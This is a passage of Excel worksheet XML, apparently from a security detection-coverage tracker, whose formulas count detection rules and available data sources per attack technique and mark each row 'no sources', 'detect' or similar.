        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M94" s="9" cm="1">
        <f t="array" ref="M94">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N94" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O94" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P94" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S9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94" t="s">
        <v>386</v>
      </c>
      <c r="U94" t="s">
        <v>754</v>
      </c>
      <c r="V94" t="s">
        <v>755</v>
      </c>
      <c r="W94" t="b">
        <v>1</v>
      </c>
      <c r="X94" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="95" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A95" t="s">
        <v>746</v>
      </c>
      <c r="B95" t="s">
        <v>756</v>
      </c>
      <c r="C95" t="s">
        <v>308</v>
      </c>
      <c r="D95" t="s">
        <v>747</v>
      </c>
      <c r="E95" t="s">
        <v>757</v>
      </c>
      <c r="F95" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G95" s="9" cm="1">
        <f t="array" ref="G95">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H95" s="9" t="str" cm="1">
        <f t="array" ref="H95">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I95" s="9" t="str" cm="1">
        <f t="array" ref="I95">IF(SUM(IF($C95=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C95=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J95" s="9" t="str" cm="1">
        <f t="array" ref="J9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95" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M95" s="9" cm="1">
        <f t="array" ref="M95">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N95" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O95" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P95" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S9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95" t="s">
        <v>386</v>
      </c>
      <c r="U95" t="s">
        <v>758</v>
      </c>
      <c r="V95" t="s">
        <v>759</v>
      </c>
      <c r="W95" t="b">
        <v>1</v>
      </c>
      <c r="X95" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="96" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A96" t="s">
        <v>746</v>
      </c>
      <c r="B96" t="s">
        <v>760</v>
      </c>
      <c r="C96" t="s">
        <v>761</v>
      </c>
      <c r="D96" t="s">
        <v>747</v>
      </c>
      <c r="E96" t="s">
        <v>757</v>
      </c>
      <c r="F96" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G96" s="9" cm="1">
        <f t="array" ref="G96">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H96" s="9" t="str" cm="1">
        <f t="array" ref="H96">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I96" s="9" t="str" cm="1">
        <f t="array" ref="I96">IF(SUM(IF($C96=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C96=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J96" s="9" t="str" cm="1">
        <f t="array" ref="J9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96" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M96" s="9" cm="1">
        <f t="array" ref="M96">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N96" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O96" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P96" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S9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96" t="s">
        <v>386</v>
      </c>
      <c r="U96" t="s">
        <v>762</v>
      </c>
      <c r="V96" t="s">
        <v>763</v>
      </c>
      <c r="W96" t="b">
        <v>1</v>
      </c>
      <c r="X96" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="97" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A97" t="s">
        <v>746</v>
      </c>
      <c r="B97" t="s">
        <v>764</v>
      </c>
      <c r="C97" t="s">
        <v>765</v>
      </c>
      <c r="D97" t="s">
        <v>747</v>
      </c>
      <c r="E97" t="s">
        <v>757</v>
      </c>
      <c r="F97" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G97" s="9" cm="1">
        <f t="array" ref="G97">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H97" s="9" t="str" cm="1">
        <f t="array" ref="H97">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I97" s="9" t="str" cm="1">
        <f t="array" ref="I97">IF(SUM(IF($C97=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C97=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J97" s="9" t="str" cm="1">
        <f t="array" ref="J9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97" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M97" s="9" cm="1">
        <f t="array" ref="M97">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N97" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O97" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P97" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S9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97" t="s">
        <v>386</v>
      </c>
      <c r="U97" t="s">
        <v>766</v>
      </c>
      <c r="V97" t="s">
        <v>767</v>
      </c>
      <c r="W97" t="b">
        <v>1</v>
      </c>
      <c r="X97" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="98" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A98" t="s">
        <v>746</v>
      </c>
      <c r="B98" t="s">
        <v>768</v>
      </c>
      <c r="C98" t="s">
        <v>769</v>
      </c>
      <c r="D98" t="s">
        <v>747</v>
      </c>
      <c r="E98" t="s">
        <v>757</v>
      </c>
      <c r="F98" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G98" s="9" cm="1">
        <f t="array" ref="G98">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H98" s="9" t="str" cm="1">
        <f t="array" ref="H98">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I98" s="9" t="str" cm="1">
        <f t="array" ref="I98">IF(SUM(IF($C98=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C98=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J98" s="9" t="str" cm="1">
        <f t="array" ref="J9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98" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M98" s="9" cm="1">
        <f t="array" ref="M98">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N98" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O98" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P98" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S9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98" t="s">
        <v>386</v>
      </c>
      <c r="U98" t="s">
        <v>770</v>
      </c>
      <c r="V98" t="s">
        <v>763</v>
      </c>
      <c r="W98" t="b">
        <v>1</v>
      </c>
      <c r="X98" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="99" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A99" t="s">
        <v>746</v>
      </c>
      <c r="B99" t="s">
        <v>771</v>
      </c>
      <c r="C99" t="s">
        <v>772</v>
      </c>
      <c r="D99" t="s">
        <v>747</v>
      </c>
      <c r="E99" t="s">
        <v>757</v>
      </c>
      <c r="F99" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G99" s="9" cm="1">
        <f t="array" ref="G99">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H99" s="9" t="str" cm="1">
        <f t="array" ref="H99">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I99" s="9" t="str" cm="1">
        <f t="array" ref="I99">IF(SUM(IF($C99=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C99=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J99" s="9" t="str" cm="1">
        <f t="array" ref="J9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99" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M99" s="9" cm="1">
        <f t="array" ref="M99">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N99" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O99" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P99" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S9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99" t="s">
        <v>416</v>
      </c>
      <c r="U99" t="s">
        <v>773</v>
      </c>
      <c r="V99" t="s">
        <v>774</v>
      </c>
      <c r="W99" t="b">
        <v>1</v>
      </c>
      <c r="X99" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="100" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A100" t="s">
        <v>746</v>
      </c>
      <c r="B100" t="s">
        <v>775</v>
      </c>
      <c r="C100" t="s">
        <v>776</v>
      </c>
      <c r="D100" t="s">
        <v>747</v>
      </c>
      <c r="E100" t="s">
        <v>777</v>
      </c>
      <c r="F100" s="9">
        <f t="shared" si="1"/>
        <v>1</v>
      </c>
      <c r="G100" s="9" cm="1">
        <f t="array" ref="G100">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H100" s="9" t="str" cm="1">
        <f t="array" ref="H100">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I100" s="9" t="str" cm="1">
        <f t="array" ref="I100">IF(SUM(IF($C100=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C100=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J100" s="9" t="str" cm="1">
        <f t="array" ref="J10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00" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M100" s="9" cm="1">
        <f t="array" ref="M100">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N100" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O100" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P100" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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00" t="s">
        <v>416</v>
      </c>
      <c r="U100" t="s">
        <v>778</v>
      </c>
      <c r="V100" t="s">
        <v>779</v>
      </c>
      <c r="W100" t="b">
        <v>1</v>
      </c>
      <c r="X100" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="101" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A101" t="s">
        <v>746</v>
      </c>
      <c r="B101" t="s">
        <v>780</v>
      </c>
      <c r="C101" t="s">
        <v>781</v>
      </c>
      <c r="D101" t="s">
        <v>747</v>
      </c>
      <c r="E101" t="s">
        <v>782</v>
      </c>
      <c r="F101" s="9">
        <f t="shared" si="1"/>
        <v>1</v>
      </c>
      <c r="G101" s="9" cm="1">
        <f t="array" ref="G101">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H101" s="9" t="str" cm="1">
        <f t="array" ref="H101">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I101" s="9" t="str" cm="1">
        <f t="array" ref="I101">IF(SUM(IF($C101=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C101=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J101" s="9" t="str" cm="1">
        <f t="array" ref="J10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01" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M101" s="9" cm="1">
        <f t="array" ref="M101">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N101" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O101" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P101" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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01" t="s">
        <v>386</v>
      </c>
      <c r="U101" t="s">
        <v>783</v>
      </c>
      <c r="V101" t="s">
        <v>784</v>
      </c>
      <c r="W101" t="b">
        <v>1</v>
      </c>
      <c r="X101" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="102" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A102" t="s">
        <v>746</v>
      </c>
      <c r="B102" t="s">
        <v>785</v>
      </c>
      <c r="C102" t="s">
        <v>786</v>
      </c>
      <c r="D102" t="s">
        <v>747</v>
      </c>
      <c r="E102" t="s">
        <v>787</v>
      </c>
      <c r="F102" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G102" s="9" cm="1">
        <f t="array" ref="G102">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H102" s="9" t="str" cm="1">
        <f t="array" ref="H102">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I102" s="9" t="str" cm="1">
        <f t="array" ref="I102">IF(SUM(IF($C102=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C102=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J102" s="9" t="str" cm="1">
        <f t="array" ref="J10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02" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M102" s="9" cm="1">
        <f t="array" ref="M102">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N102" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O102" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P102" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S10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02" t="s">
        <v>386</v>
      </c>
      <c r="U102" t="s">
        <v>788</v>
      </c>
      <c r="V102" t="s">
        <v>789</v>
      </c>
      <c r="W102" t="b">
        <v>1</v>
      </c>
      <c r="X102" t="s">
        <v>746</v>
      </c>
    </row>
    <row r="103" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A103" t="s">
        <v>746</v>
      </c>
      <c r="B103" t="s">
        <v>790</v>
      </c>
      <c r="C103" t="s">
        <v>791</v>
      </c>
      <c r="D103" t="s">
        <v>747</v>
      </c>
      <c r="E103" t="s">
        <v>792</v>
      </c>
      <c r="F103" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G103" s="9" cm="1">
        <f t="array" ref="G103">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H103" s="9" t="str" cm="1">
        <f t="array" ref="H103">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I103" s="9" t="str" cm="1">
        <f t="array" ref="I103">IF(SUM(IF($C103=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C103=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J103" s="9" t="str" cm="1">
        <f t="array" ref="J10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03" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M103" s="9" cm="1">
        <f t="array" ref="M103">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N103" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O103" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
